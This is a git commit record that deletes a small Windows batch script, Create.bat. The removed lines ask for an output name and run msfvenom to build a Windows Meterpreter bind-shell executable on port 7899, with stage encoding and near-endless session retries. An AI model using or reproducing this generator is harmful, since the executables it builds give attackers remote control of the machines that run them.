905126a90bf0e19b92bcc4f2cd3048e5ddc7e46c
a7ecc <102755240+a7ecc@users.noreply.github.com>
2024-01-02 17:39:09 +0400

    Delete Create.bat

--- Create.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-title Create
-:res
-cls
-set /p name=Enter the output name:
-if "%name%"=="" goto res
-msfvenom -p windows/meterpreter/bind_tcp LPORT=7899 EnableStageEncoding=true SessionRetryTotal=999999 -f exe -o "%name%.exe"
